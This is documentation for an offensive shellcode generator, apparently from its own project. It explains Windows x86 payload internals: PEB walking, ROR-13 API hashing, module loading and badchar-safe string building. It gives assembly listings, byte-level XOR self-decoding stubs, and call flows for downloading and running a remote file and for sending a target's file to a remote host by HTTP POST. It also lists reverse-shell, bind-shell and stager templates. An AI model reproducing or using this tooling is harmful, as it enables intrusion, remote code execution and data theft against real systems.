# Emitter Internals: How the Shellcode Works

This document explains what the emitter produces at the assembly level --
the techniques used, the data structures involved, and how each phase
of execution works. It is a conceptual reference; for the exact byte
offsets and slot assignments of a specific build, see the generated
`contract.md` in the build output.

---

## Execution overview

Every shellcode payload the emitter produces follows the same five-phase
structure. The framework handles phases 1-4 automatically; only phase 5
(the payload) varies between templates.

```
Phase 1: PEB walk           Find kernel32.dll base address
Phase 2: API resolution     Hash-match exported function names
Phase 3: Module chaining    LoadLibraryA for ws2_32.dll, wininet.dll, etc.
Phase 4: Data construction  Build strings and structs on the stack
Phase 5: Payload            Template-specific call sequence
```

The entire payload is position-independent -- no absolute addresses, no
relocations, no imports. It runs from any memory location.

---

## The stack frame

On entry, the shellcode captures the stack pointer and reserves a
dynamically sized frame. The allocator computes the high-water mark
from all slots and rounds up to the next 0x100 boundary (e.g. 0x500
for a typical manifest, larger when strings are long). The subtraction
immediate is then encoded badchar-safe:

```asm
mov  ebp, esp          ; snapshot the stack pointer
<encode frame_size into ecx, avoiding badchars>
sub  esp, ecx          ; reserve frame_size bytes
```

EBP becomes the anchor for all subsequent data. Every resolved API
pointer, runtime variable, and constructed string lives at a negative
offset from EBP. The frame is divided into zones:

```
Higher addresses (toward original stack)
                    +---------------------------+
EBP  ------------->| (original stack data)      |
                    +---------------------------+
                    | Export context (transient) |  [ebp-0x04] .. [ebp-0x18]
                    +---------------------------+
                    | Module base pointers      |  one DWORD per DLL
                    +---------------------------+
                    | API function pointers     |  one DWORD per resolved function
                    +---------------------------+
                    | Variables                 |  one DWORD per runtime variable
                    +---------------------------+
                    | Structures                |  fixed start at 0x80 boundary
                    +---------------------------+
                    | Strings                   |  variable-length, 4-byte aligned
                    +---------------------------+
                    | (unused / headroom)       |
                    +---------------------------+
ESP = EBP - N      | (N = frame_size, see above) |
                    +---------------------------+
Lower addresses
```

### Zone details

**Export context** (`[ebp-0x04]` through `[ebp-0x18]`): Transient storage
used by the hash resolver. Holds the current module base, the three
export table pointers (AddressOfNames, AddressOfNameOrdinals,
AddressOfFunctions), the name count, and the target hash being searched.
These are overwritten each time the resolver switches to a new module.

**Module bases**: One DWORD per DLL the shellcode uses. `kernel32.dll`
is always first (found via PEB walk). Additional modules like
`ws2_32.dll` or `wininet.dll` are loaded via `LoadLibraryA` and their
base addresses are stored here.

**API function pointers**: One DWORD per resolved Win32 function, in the
order they appear in the manifest. After resolution, calling a function
is just `call dword ptr [ebp-0xNN]`.

**Variables**: Scratch DWORDs for runtime values -- socket handles, file
handles, buffer pointers, byte counters. The payload template reads and
writes these during execution.

**Structures**: Fixed-size structures (e.g., `STARTUPINFOA` at 0x44
bytes) that begin at the `0x80` boundary from EBP. Structure order is
determined by scanning the manifest's function list: each API record
in `api_database.py` may declare a `requires_structs` field, and
structures appear in the order they are first encountered.

**Strings**: Null-terminated strings built by the emitter's encoding
pipeline. Each string is 4-byte aligned and constructed via one of four
methods (see String Construction below). Strings follow structures in
the frame.

The exact offset for every slot in a given build is printed in the
generated `contract.md`. Offsets shift whenever you add or remove
functions, variables, or strings from the manifest.

---

## Phase 1: Finding kernel32.dll via the PEB

Every Win32 process has a Process Environment Block (PEB) accessible
at `fs:[0x30]` on x86. The PEB contains the loader data structure
(`PEB_LDR_DATA`), which maintains linked lists of all loaded modules.

The shellcode walks the `InInitializationOrderModuleList`:

```
TEB             fs:[0x00]
  +0x30 ----> PEB
                +0x0C ----> PEB_LDR_DATA
                              +0x1C ----> InInitializationOrderModuleList
                                            (doubly-linked list of LDR_DATA_TABLE_ENTRY)
```

Each entry in the list contains the module's base address and its name
as a Unicode string. The shellcode assumes the loader stores
`KERNEL32.DLL` in uppercase (which is the case on all observed Windows
versions) and performs case-sensitive comparisons against the uppercase
Unicode values for "K" (0x004B), "E" (0x0045), and "3" (0x0033).

```asm
get_first_ldr_entry:
    xor ecx, ecx
    mov eax, fs:[ecx + 0x30]    ; PEB
    mov eax, [eax + 0x0C]       ; PEB_LDR_DATA
    mov eax, [eax + 0x1C]       ; InInitializationOrderModuleList
    sub eax, 0x10               ; adjust to LDR_DATA_TABLE_ENTRY start
    ret

find_kernel32_entry:
    mov esi, [eax + 0x30]       ; BaseDllName.Buffer (Unicode)
    cmp word [esi], 0x004B      ; 'K'
    jne next
    cmp word [esi+0x02], 0x0045 ; 'E'
    jne next
    cmp word [esi+0x0C], 0x0033 ; '3'
    jne next
    mov ebx, [eax + 0x18]       ; DllBase -> EBX
    ret

next:
    mov eax, [eax + 0x10]       ; Flink (next entry)
    sub eax, 0x10               ; adjust offset
    jmp find_kernel32_entry
```

After this phase, EBX holds the base address of `kernel32.dll`.

---

## Phase 2: API resolution via ROR-13 hashing

With a module's base address in EBX, the shellcode parses its PE
headers to locate the export directory:

```
EBX (module base)
  +0x3C ----> e_lfanew (offset to PE signature)
PE signature
  +0x78 ----> Export Directory RVA (IMAGE_DIRECTORY_ENTRY_EXPORT)
Export Directory
  +0x18 ----> NumberOfNames
  +0x1C ----> AddressOfFunctions (EAT)
  +0x20 ----> AddressOfNames (ENT)
  +0x24 ----> AddressOfNameOrdinals (EOT)
```

These three tables work together:
- **AddressOfNames (ENT)**: array of RVAs to null-terminated function name strings
- **AddressOfNameOrdinals (EOT)**: array of 16-bit ordinals, parallel to ENT
- **AddressOfFunctions (EAT)**: array of function RVAs, indexed by ordinal

To find a function by name, the shellcode iterates AddressOfNames,
hashing each name with the ROR-13 algorithm and comparing against a
precomputed target hash.

### The ROR-13 hash

The hash function rotates the accumulator right by 13 bits, then adds
each character:

```asm
compute_hash:
    xor eax, eax           ; clear
    xor edx, edx           ; accumulator = 0
    cld

hash_loop:
    lodsb                   ; AL = next byte from [ESI], ESI++
    test al, al             ; null terminator?
    jz hash_done
    ror edx, 0x0D           ; rotate right 13 bits
    movzx eax, al
    add edx, eax            ; accumulate
    jmp hash_loop

hash_done:
    ret                     ; hash in EDX
```

This produces a 32-bit hash for any function name. Example hashes:

| Function            | ROR-13 Hash    |
|---------------------|----------------|
| LoadLibraryA        | `0xec0e4e8e`   |
| VirtualAlloc        | `0x91afca54`   |
| InternetOpenA       | `0x57e84429`   |
| WinExec             | `0x0e8afe98`   |

The emitter precomputes these hashes and embeds them as immediates:

```asm
mov  eax, 0xec0e4e8e           ; hash of "LoadLibraryA"
call resolve_export_by_hash    ; search current module's exports
mov  [ebp-0xNN], eax           ; store resolved address
```

### Resolution loop

`resolve_export_by_hash` iterates the export name table, hashing each
name and comparing it to the target:

```
for index = 0 to NumberOfNames-1:
    name = module_base + AddressOfNames[index]
    if ror13_hash(name) == target_hash:
        ordinal = AddressOfNameOrdinals[index]
        address = module_base + AddressOfFunctions[ordinal]
        return address
```

The resolved function pointer goes into the API slot on the stack frame.
After all APIs for a module are resolved, the shellcode can call them:

```asm
push arg2
push arg1
call dword ptr [ebp-0xNN]      ; call resolved function
```

---

## Phase 3: Module chaining via LoadLibraryA

`kernel32.dll` is always available (found via PEB walk), and it exports
`LoadLibraryA`. To use APIs from other DLLs, the shellcode:

1. Resolves `LoadLibraryA` from kernel32's export table
2. Constructs the DLL name string on the stack (e.g., "ws2_32.dll")
3. Calls `LoadLibraryA` to get the new module's base address
4. Re-runs the export table parser on the new module
5. Resolves that module's APIs using the same hash-matching loop

```asm
; Build "wininet.dll\0" on stack via push (reversed, null-terminated)
push 0x016d6d65                ; "emm\x01" (XOR-encoded to avoid null)
xor  dword ptr [esp], 0x01010101
push 0x2e74656e                ; "net."
push 0x696e6977                ; "wini"
mov  esi, esp                  ; ESI -> "wininet.dll"

push esi
call dword ptr [ebp-0xNN]      ; LoadLibraryA("wininet.dll")
mov  [ebp-0xMM], eax           ; save wininet.dll base

; Switch to wininet's export table
mov  ebx, eax                  ; EBX = new module base
call get_export_directory
call get_export_tables
call save_export_context

; Now resolve wininet APIs using the same hash loop
mov  eax, 0x57e84429           ; hash of "InternetOpenA"
call resolve_export_by_hash
mov  [ebp-0xPP], eax           ; store pointer
```

The module load order is defined in `api_database.py`:

| Module          | Loaded via       |
|-----------------|------------------|
| kernel32.dll    | PEB walk         |
| ws2_32.dll      | LoadLibraryA     |
| wininet.dll     | LoadLibraryA     |

APIs from kernel32 are resolved first. Then for each additional DLL,
the framework pushes the DLL name, calls LoadLibraryA, and resolves
that DLL's APIs before moving to the next.

---

## Phase 4: String construction

Strings (URLs, file paths, command lines, user-agent strings) are built
on the stack frame. The `mov`, `shiftor`, and `xor` methods write to
the string's assigned frame offset. The `push` method is different --
it builds the string at ESP (see below). Four encoding methods are
available:

### mov method

Writes 4 bytes at a time to a destination address (usually via EDI):

```asm
lea  edi, [ebp-0xNN]          ; destination buffer
mov  eax, 0x70747468           ; "http" (little-endian)
mov  [edi], eax
mov  eax, 0x312f2f3a           ; "://1"
mov  [edi+0x04], eax
; ... continue for each DWORD
```

The null terminator is handled by XOR-encoding the final DWORD:

```asm
mov  eax, 0x01657865           ; "exe\x01" (encoded)
xor  eax, 0x01010101           ; decode -> "exe\x00"
mov  [edi+0x1C], eax
```

### push method

Pushes DWORDs onto the stack in reverse order. After all pushes, ESP
points to the start of the string -- it lives at the current stack
top, not at the string's assigned frame offset (that offset exists
only for documentation in the layout). Used for short strings like
DLL names that are consumed immediately by LoadLibraryA and then
cleaned up:

```asm
push 0x016d6d65                ; last chunk (encoded)
xor  dword ptr [esp], 0x01010101
push 0x2e74656e                ; middle
push 0x696e6977                ; first
mov  esi, esp                  ; ESI -> "wininet.dll\0"
```

### shiftor method

Builds each DWORD using shift-left and OR operations. Avoids byte
patterns that mov might produce in certain badchar configurations.

### xor method

XOR-encodes each DWORD against a computed mask that avoids all
badchars.

### Automatic badchar avoidance in string data

The `mov` and `push` string methods primarily target null bytes: when a
DWORD would contain 0x00 (as padding or a null terminator), the emitter
computes an XOR mask so that:
- The XOR of the value and mask produces the desired bytes
- Neither the value nor the mask contains a null byte

The mask `0x01010101` is the most common choice. The decoder
instruction (`xor eax, 0x01010101`) is emitted inline.

If other badchars (e.g. 0x0a, 0x0d) appear in the string data, the
build reports them rather than silently removing them -- the `xor`
method or the `--encode` flag should be used instead.

Note: this covers the data values only. Fixed opcodes, ModRM/SIB
bytes, and branch displacements in the assembled output may still
contain forbidden bytes. The `safe_*` helpers handle most instruction
encodings, but final assembled-byte scanning (and `--encode` if
needed) remain the last line of defense.

---

## Phase 5: Payload templates

After phases 1-4 complete, every manifest-declared API is resolved at
its stack slot, every string is constructed in the frame, and every
variable slot is allocated. The payload template code runs next.

A template is a sequence of Win32 API calls using the stdcall calling
convention: push arguments right-to-left, call through the resolved
pointer. API return values are placed in EAX; templates should validate
them when subsequent operations depend on success.

### Example: HTTP download flow

```
InternetOpenA(user_agent, 1, NULL, NULL, 0)
    |
    v  hSession
InternetOpenUrlA(hSession, url, NULL, 0, 0, 0)
    |
    v  hUrl
VirtualAlloc(NULL, alloc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    |
    v  buffer pointer
InternetReadFile loop:
    InternetReadFile(hUrl, buffer + offset, chunk_size, &bytes_read)
    if bytes_read == 0: break (EOF)
    offset += bytes_read
    |
    v  buffer contains file data, offset = total bytes
InternetCloseHandle(hUrl)
InternetCloseHandle(hSession)
CreateFileA(dst_path, GENERIC_WRITE, ...)
WriteFile(file_handle, buffer, total_bytes, ...)
CloseHandle(file_handle)
WinExec(dst_path, SW_SHOWNORMAL)
```

### Example: HTTP POST exfiltration flow

```
CreateFileA(src_path, GENERIC_READ, ...)
    |
    v  file_handle
VirtualAlloc(NULL, alloc_size, ...)
    |
    v  buffer pointer
ReadFile loop:
    ReadFile(file_handle, buffer + offset, chunk_size, &bytes_read)
    if bytes_read == 0: break (EOF)
    offset += bytes_read
    |
    v  buffer contains file data, offset = total bytes
CloseHandle(file_handle)
InternetOpenA(user_agent, 1, NULL, NULL, 0)
    |
    v  hSession
InternetConnectA(hSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)
    |
    v  hConnect
HttpOpenRequestA(hConnect, "POST", url_path, NULL, NULL, NULL, 0, 0)
    |
    v  hRequest
HttpSendRequestA(hRequest, NULL, 0, buffer, total_bytes)
InternetCloseHandle(hRequest)
InternetCloseHandle(hConnect)
InternetCloseHandle(hSession)
```

### Calling convention in assembly

Every API call follows the same pattern:

```asm
; Push arguments right-to-left (last arg first)
xor  eax, eax
push eax                       ; dwFlags = 0 (NULL/zero args)
push eax                       ; another NULL
lea  eax, [ebp-0xNN]           ; load string pointer
push eax                       ; string argument
push dword ptr [ebp-0xMM]      ; handle from a previous call
call dword ptr [ebp-0xPP]      ; call resolved API
mov  [ebp-0xQQ], eax           ; save return value
```

The `safe_*` helper functions from `encode.py` generate these
instructions with automatic badchar avoidance on all displacement
values and immediates.

---

## XOR encoder

When the assembled shellcode contains forbidden bytes that the template
could not avoid (e.g., in jump displacements or instruction encodings),
the `--encode` flag applies a whole-payload XOR encoding.

### How it works

1. **Key search**: Try every byte 0x01 through 0xFF (skipping forbidden
   bytes). For each candidate key, XOR every byte of the raw payload.
   If the result contains no forbidden bytes, this key is viable.

2. **Stub construction**: Build a self-decoding stub that:
   - Uses `call`/`pop` (or `fldz`/`fnstenv`/`pop`) to find its own
     address at runtime (position-independent EIP recovery)
   - Loads the payload length into ECX
   - XORs each encoded byte in place with the key
   - Falls through to the now-decoded payload

3. **Stub validation**: The stub itself must also be free of forbidden
   bytes. Displacement values in the `jmp`, `loop`, and `call`
   instructions depend on the stub's size, so the emitter tries
   different amounts of neutral padding (NOP, CLD, CLC, etc.) to shift
   displacements until a clean stub is found.

### Decoder stub layout (call-based)

```
[optional padding]         neutral bytes to shift displacements
EB [disp]                  jmp short call_tag
                           decoder:
5E                           pop esi            ; ESI = &encoded_payload
31 C9                        xor ecx, ecx
B1 [len]                     mov cl, payload_len (or 66 B9 [lo] [hi] for >255)
[optional padding]
                           decode_loop:
80 36 [key]                  xor byte [esi], key
46                           inc esi
E2 [disp]                    loop decode_loop
EB 05                        jmp short payload
                           call_tag:
E8 [d0 d1 d2 d3]            call decoder       ; pushes &payload onto stack
                           payload:
[encoded bytes...]           XOR'd payload starts here
```

### Decoder stub layout (fnstenv-based)

Used as a fallback when no call-based stub variant can avoid the
configured badchars (typically 0xFF in the call displacement):

```
D9 EE                      fldz               ; push +0.0 onto FPU stack
D9 74 24 F4                fnstenv [esp-0x0C]  ; save FPU env, EIP at [esp]
5E                         pop esi             ; ESI = &fldz instruction
[optional padding]
83 C6 [off]                add esi, offset     ; ESI = &payload
31 C9                      xor ecx, ecx
B1 [len]                   mov cl, payload_len
56                         push esi            ; save payload addr for ret
                           decode_loop:
80 36 [key]                  xor byte [esi], key
46                           inc esi
E2 [disp]                    loop decode_loop
C3                         ret                 ; jump to decoded payload
```

---

## Badchar handling throughout the pipeline

Badchar avoidance is not a post-processing step -- it is woven into
every layer of code generation:

| Layer                    | Technique                                      |
|--------------------------|-------------------------------------------------|
| String construction      | XOR-encode DWORDs containing forbidden bytes    |
| Immediate values         | `encode_dword()` -- XOR pair where neither      |
|                          | half contains forbidden bytes                   |
| Stack displacements      | `safe_lea`, `safe_mem_load/store` -- alternate   |
|                          | instruction sequences when `[ebp+disp]` has a   |
|                          | forbidden byte in the displacement               |
| Push immediates          | `safe_push_imm`, `safe_push_dword` -- register  |
|                          | intermediary when the immediate is dirty         |
| Call/load through memory | `safe_call_mem`, `safe_push_mem` -- badchar-safe |
|                          | dereference and call patterns                    |
| ROR-13 hash              | Hash immediates are checked; XOR-encoded if      |
|                          | they contain forbidden bytes                     |
| Stack reservation        | Frame size encoded into a register, then         |
|                          | `sub esp, ecx` -- avoids nulls in the immediate  |
| XOR encoder (optional)   | Whole-payload encoding as a last resort          |

The manifest's `badchars` list is the single source of truth. It flows
through every encoding decision automatically.

---

## Trampoline structure

The framework stubs must fit within `jmp short` range (127 bytes) of
the entry point. Since the stubs exceed this, the emitter uses two
trampolines:

```
_start:
    jmp short _stub_trampoline1           ; +2 bytes

[Part 1a: PEB walk + kernel32 find]       ; < 127 bytes from _start

_stub_trampoline1:
    jmp short _stub_trampoline2           ; +2 bytes

[Part 1b: export tables + save context]

_stub_trampoline2:
    jmp short main                        ; +2 bytes

[Part 2: hash compute + resolve loop]

main:
    mov ebp, esp
    sub esp, <frame_size>       ; badchar-safe encoding of total frame
    ; ... phases 2-5 ...
```

This keeps all framework code before `main` while staying within
short-jump reach.

---

## Reading the generated contract.md

Each build produces `emitter_out/Documentation/contract.md` with the
exact layout for that specific manifest. It contains:

- **Stack map**: every slot's offset, name, and size
- **API reference**: every resolved function's prototype, arguments,
  return value, and ROR-13 hash
- **Operational cheatsheet**: listener/server commands, file paths,
  and shellcode size

The stack map is the definitive reference for debugging in WinDbg.
When setting breakpoints or inspecting memory:

```
; In WinDbg, after the shellcode sets up EBP:
dd @ebp-NN L1       ; read a DWORD at the slot offset from contract.md
db poi(@ebp-NN) L40 ; dereference a pointer stored at that slot
```

---

## Template architecture

Templates are Python classes with one required method:

```python
class MyTemplate(PayloadTemplate):
    def emit(self, layout, config: TemplateConfig) -> str:
        # layout.slot("FunctionName") -> Slot with .offset and .ebp_ref
        # config.badchars -> set of forbidden byte values
        # Returns assembly text (string)
```

The `probe_slots()` method (inherited from `PayloadTemplate`)
auto-discovers which API functions a template uses by running `emit()`
against a recording layout. The build pipeline uses this to auto-derive
missing API requirements -- if the template calls
`layout.slot("VirtualAlloc")` but the manifest doesn't list
`VirtualAlloc`, the build adds it automatically.

Note: `probe_slots()` only auto-adds API functions. Variables and
strings must still be declared in the manifest -- the probe has no way
to infer their types or initial values.

---

## Available templates

| Template         | Purpose                                          | Needs lhost/lport | Needs --url |
|------------------|--------------------------------------------------|-------------------|-------------|
| reverse_shell    | Connect-back shell via Winsock                   | Yes (sockaddr_in) | No          |
| bind_shell       | Listen for incoming connection (scaffold)         | Port only         | No          |
| run_command      | Execute a command via WinExec                    | No                | No          |
| copy_file        | Copy a file via CopyFileA                        | No                | No          |
| copy_then_run    | Copy file, then execute destination              | No                | No          |
| move_then_run    | Move file, then execute destination              | No                | No          |
| tcp_download     | Receive file over TCP, write to disk, execute    | Yes (sockaddr_in) | No          |
| tcp_stager       | Receive shellcode over TCP, execute in memory    | Yes (sockaddr_in) | No          |
| http_download    | GET file via WinInet, write to disk, execute     | Auto from --url   | Yes         |
| http_exfil       | Read file from target, POST via WinInet          | Auto from --url   | Yes         |
